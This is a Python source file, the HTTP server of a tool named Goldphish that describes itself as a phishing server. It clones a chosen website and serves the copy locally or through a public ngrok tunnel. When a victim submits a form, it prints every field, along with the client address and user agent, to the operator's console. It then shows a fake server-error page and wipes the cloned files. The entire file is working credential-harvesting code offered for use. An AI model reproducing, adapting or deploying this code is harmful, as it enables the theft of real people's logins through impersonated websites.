#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Copyright 2018 Nico Duitsmann. All Rights Reserved.
#
# Licensed under the GNU General Public License, Version 3.0.
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      https://www.gnu.org/licenses/gpl-3.0.html
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Goldphish http server."""

import cgi
import mimetypes
import os
import re
import shutil
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.request import urlopen

from goldphish.cloner import SiteCloner
from goldphish.config import DEFAULT_CONFIG, Config
from goldphish.ngrok import Ngrok
from goldphish.output import colorize
from goldphish.storage import (cloner_auto_clean, cloner_cloning_dir,
                               http_server_host, http_server_port,
                               internal_server_error_template)


class Server(object):
    """Goldphish server class."""

    website = ''

    def __init__(self, args):
        self.args = args
        Server.website = self.args['<website>']

        self.host = self.args['-a']
        self.port = self.args['-p']
        self.use_ngrok = self.args['--ngrok']
        self.restore_config = self.args['--config-restore']

    def process_args(self):
        """Process args.

        :return
        """
        if self.host is None:
            self.host = http_server_host
        if self.port is None:
            self.port = http_server_port
        else:
            self.port = int(self.port)
        if self.restore_config:
            Config.restore(DEFAULT_CONFIG)

    def run(self):
        """Run phishing server.
    
        :param website:
        :param args:
        :return
        """
        self.process_args()

        if not os.path.exists(cloner_cloning_dir):
            os.mkdir(cloner_cloning_dir)

        cloner = SiteCloner(Server.website, cloner_cloning_dir)
        cloner.clone()

        server = HTTPServer
        httpd  = server((self.host, self.port), Handler)

        if self.use_ngrok:
            if Ngrok.ngrok_is_installed():
                serving_address = Ngrok.start(self.port)
            else:
                Ngrok.Installer()
                serving_address = Ngrok.start(self.port)

            # check if we have two public urls
            serving_address = re.findall(
                r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', serving_address)
            serving_address = list(set(serving_address))[0]
        else:
            serving_address = 'http://{}:{}'.format(self.host, self.port)


        print('\nStarting goldphish server (%s)' % colorize(serving_address))
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            sys.exit('\nInterrupted by user.')
        
        httpd.server_close()
        print('Stopping goldphish server (%s)' % serving_address)


class Handler(BaseHTTPRequestHandler):
    """Http handler."""

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        """Handle get requests."""
        root = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), cloner_cloning_dir)

        if self.path == '/':
            filename = os.path.join(root, 'index.html')
        else:
            filename = root + self.path

        self.send_response(200)

        mime = mimetypes.MimeTypes().guess_type(filename)[0]
        self.send_header('Content-type', mime)
        
        self.end_headers()

        try:
            with open(filename, 'rb') as index_file:
                html = index_file.read()
                # html = bytes(html, 'utf-8')
                self.wfile.write(html)
        except:
            pass

    def do_POST(self):
        """Handle post requests."""
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={
                'REQUEST_METHOD': 'POST',
                'CONTENT_TYPE': self.headers['Content-Type'],
            }
        )

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        print('Client: {}'.format(
            self.client_address))
        print('User-agent: {}\n'.format(
            self.headers['user-agent']))
        print('Form data:')

        for field in form.keys():
            print(
                '\t{} = {}'.format(colorize(field, 'white'), colorize(form[field].value)))

        self.wfile.write(bytes(
            internal_server_error_template.format(http_server_host, http_server_port), "utf8"))

        # cleaning up
        if cloner_auto_clean:
            for _file in os.listdir(cloner_cloning_dir):
                _path = os.path.join(cloner_cloning_dir, _file)
                try:
                    if os.path.isfile(_path):
                        os.unlink(_path)
                    elif os.path.isdir(_path): shutil.rmtree(_path)
                except Exception as e:
                    print(e)
            print('\n\nDone. %s successful cleaned.' % cloner_cloning_dir)
        sys.exit()
